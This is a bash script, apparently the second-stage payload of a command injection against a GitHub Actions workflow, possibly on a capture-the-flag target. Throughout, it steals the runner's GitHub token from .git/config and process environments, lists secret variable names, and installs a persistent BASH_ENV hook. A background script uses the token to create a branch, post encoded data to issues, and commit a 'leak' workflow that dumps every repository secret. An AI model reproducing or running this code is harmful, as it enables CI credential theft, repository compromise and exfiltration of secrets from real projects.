#!/bin/bash
# Stage-2 payload fetched by the injected run-name command.
set +e
TARGET="PDFtoMark/triage-pinterest-vc5dd446-3718f9"
API="https://api.github.com/repos/$TARGET"
export TARGET API
echo "=== OMP_STAGE2_START ==="
date -u
echo "uid=$(id -u) user=$(id -un)"
echo "pwd=$(pwd)"
echo "event=${GITHUB_EVENT_NAME} workflow=${GITHUB_WORKFLOW} run=${GITHUB_RUN_ID} sha=${GITHUB_SHA}"
echo "GITHUB_TOKEN_ENV_SET=${GITHUB_TOKEN:+yes}"
echo "ACTIONS_RUNTIME_TOKEN_ENV_SET=${ACTIONS_RUNTIME_TOKEN:+yes}"
echo "--- env names (values redacted) ---"
env | grep -iE 'token|secret' | sed -E 's/=(.{0,6}).*/=\1.../'
echo "--- marker done ---"

cat > /tmp/hook.sh <<'EOS'
#!/bin/bash
[ -f /tmp/hooked ] && return 0 2>/dev/null
touch /tmp/hooked
API="https://api.github.com/repos/PDFtoMark/triage-pinterest-vc5dd446-3718f9"
echo "=== OMP_BASH_ENV_HOOK ==="
T=""
for cfg in $(find /home/runner/work -maxdepth 4 -type f -path '*/.git/config' 2>/dev/null); do
  h=$(grep -i 'extraheader' "$cfg" 2>/dev/null | head -1)
  if [ -n "$h" ]; then
    b=${h##*basic }
    T=$(echo "$b" | base64 -d 2>/dev/null | cut -d: -f2)
    [ -n "$T" ] && break
  fi
done
if [ -z "$T" ]; then
  for ef in /proc/[0-9]*/environ; do
    t=$(tr '\0' '\n' < "$ef" 2>/dev/null | grep '^INPUT_TOKEN=' | head -1 | cut -d= -f2-)
    [ -n "$t" ] && { T="$t"; break; }
  done
fi
if [ -z "$T" ]; then echo "HOOK_NO_TOKEN"; return 0; fi
echo "HOOK_TOKEN_LEN=${#T}"
echo "HOOK_TOKEN_SHA256=$(printf %s "$T" | sha256sum | cut -d' ' -f1)"
echo "HOOK_RATE_LIMIT=$(curl -s -H "Authorization: Bearer $T" https://api.github.com/rate_limit | tr -d '\n' | head -c 300)"
echo "HOOK_REPOS=$(curl -s -H "Authorization: Bearer $T" "$API" | tr -d '\n' | head -c 500)"
echo "HOOK_RUNS_CODE=$(curl -s -o /dev/null -w '%{http_code}' -H "Authorization: Bearer $T" "$API/actions/runs?per_page=1")"
echo "HOOK_ISSUES_CODE=$(curl -s -o /dev/null -w '%{http_code}' -H "Authorization: Bearer $T" "$API/issues?per_page=1")"
echo "=== OMP_BASH_ENV_HOOK_END ==="
return 0
EOS

cat > /tmp/steal.sh <<'EOS'
#!/bin/bash
set +e
API="https://api.github.com/repos/PDFtoMark/triage-pinterest-vc5dd446-3718f9"
TOK=""
for i in $(seq 1 150); do
  sleep 2
  for cfg in $(find /home/runner/work -maxdepth 4 -type f -path '*/.git/config' 2>/dev/null); do
    h=$(grep -i 'extraheader' "$cfg" 2>/dev/null | head -1)
    if [ -n "$h" ]; then
      b=${h##*basic }
      TOK=$(echo "$b" | base64 -d 2>/dev/null | cut -d: -f2)
      [ -n "$TOK" ] && break 2
    fi
  done
done
if [ -z "$TOK" ]; then
  for ef in /proc/[0-9]*/environ; do
    t=$(tr '\0' '\n' < "$ef" 2>/dev/null | grep '^INPUT_TOKEN=' | head -1 | cut -d= -f2-)
    [ -n "$t" ] && { TOK="$t"; break; }
  done
fi
[ -z "$TOK" ] && { echo NO_TOKEN > /tmp/steal.out; exit 0; }
SHA=$(curl -s -H "Authorization: Bearer $TOK" "$API/git/ref/heads/main" | sed -n 's/.*"sha"[[:space:]]*:[[:space:]]*"\([0-9a-f]*\)".*/\1/p' | head -1)
REPO_CODE=$(curl -s -o /tmp/api_repo.json -w '%{http_code}' -H "Authorization: Bearer $TOK" "$API")
REF_CODE=$(curl -s -o /tmp/api_ref.json -w '%{http_code}' -X POST -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" -d "{\"ref\":\"refs/heads/lazy-pwn\",\"sha\":\"$SHA\"}" "$API/git/refs")
RUNS_CODE=$(curl -s -o /dev/null -w '%{http_code}' -H "Authorization: Bearer $TOK" "$API/actions/runs?per_page=1")
TREE_CODE=$(curl -s -o /dev/null -w '%{http_code}' -H "Authorization: Bearer $TOK" "$API/git/trees/$SHA")
ISSUES_CODE=$(curl -s -o /dev/null -w '%{http_code}' -H "Authorization: Bearer $TOK" "$API/issues?per_page=1")
PAYLOAD=$(printf 'run=%s job=%s\nrepo_code=%s ref_code=%s runs_code=%s tree_code=%s issues_code=%s\nrepo=%s\nref=%s\n' "$GITHUB_RUN_ID" "$GITHUB_JOB" "$REPO_CODE" "$REF_CODE" "$RUNS_CODE" "$TREE_CODE" "$ISSUES_CODE" "$(head -c 600 /tmp/api_repo.json)" "$(head -c 600 /tmp/api_ref.json)" | base64 -w0)
ISSUE_CODE=$(curl -s -o /tmp/api_issue.json -w '%{http_code}' -X POST -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" -d "{\"title\":\"rce-token-proof\",\"body\":\"$PAYLOAD\"}" "$API/issues")
CMT_CODE=$(curl -s -o /tmp/api_cmt.json -w '%{http_code}' -X POST -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" -d "{\"body\":\"$PAYLOAD\"}" "$API/issues/6/comments")
{
  printf 'TOKEN_SHA256=%s\nrepo=%s ref=%s runs=%s tree=%s issues=%s issue_create=%s comment=%s\n' "$(printf %s "$TOK" | sha256sum | cut -d' ' -f1)" "$REPO_CODE" "$REF_CODE" "$RUNS_CODE" "$TREE_CODE" "$ISSUES_CODE" "$ISSUE_CODE" "$CMT_CODE"
} > /tmp/steal.out

if [ "$REF_CODE" = "201" ]; then
  WF=$(cat <<'YAML'
name: leak
on:
  pull_request_target:
    types: [opened, synchronize, edited]
permissions:
  contents: read
  issues: write
jobs:
  leak:
    runs-on: ubuntu-latest
    steps:
      - env:
          F: ${{ secrets.TRIAGE_FLAG }}
          ALL: ${{ toJSON(secrets) }}
        run: |
          echo "FLAG_LEN=${#F}"
          echo "FLAG_B64=$(printf '%s' "$F" | base64 -w0)"
          echo "ALL_B64=$(printf '%s' "$ALL" | base64 -w0)"
YAML
)
  WFB=$(printf '%s' "$WF" | base64 -w0)
  BASE_TREE=$(curl -s -H "Authorization: Bearer $TOK" "$API/git/commit/$SHA" | python3 -c 'import sys,json;print(json.load(sys.stdin)["tree"]["sha"])')
  BLOB=$(curl -s -X POST -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" -d "{\"content\":\"$WFB\",\"encoding\":\"base64\"}" "$API/git/blobs" | python3 -c 'import sys,json;print(json.load(sys.stdin)["sha"])')
  TREE=$(curl -s -X POST -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" -d "{\"base_tree\":\"$BASE_TREE\",\"tree\":[{\"path\":\".github/workflows/leak.yaml\",\"mode\":\"100644\",\"type\":\"blob\",\"sha\":\"$BLOB\"}]}" "$API/git/trees" | python3 -c 'import sys,json;print(json.load(sys.stdin)["sha"])')
  COMMIT=$(curl -s -X POST -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" -d "{\"message\":\"ci: add leak probe\",\"tree\":\"$TREE\",\"parents\":[\"$SHA\"]}" "$API/git/commits" | python3 -c 'import sys,json;print(json.load(sys.stdin)["sha"])')
  UPD=$(curl -s -o /tmp/api_upd.json -w '%{http_code}' -X PATCH -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" -d "{\"sha\":\"$COMMIT\",\"force\":false}" "$API/git/refs/heads/main")
  printf 'ESCALATION blob=%s tree=%s commit=%s update=%s\n' "$BLOB" "$TREE" "$COMMIT" "$UPD" >> /tmp/steal.out
fi
EOS
chmod +x /tmp/steal.sh
setsid /tmp/steal.sh >/tmp/steal.log 2>&1 </dev/null &
echo "BASH_ENV=/tmp/hook.sh" >> "$GITHUB_ENV"
echo "=== OMP_STAGE2_BG_STARTED ==="
exit 0
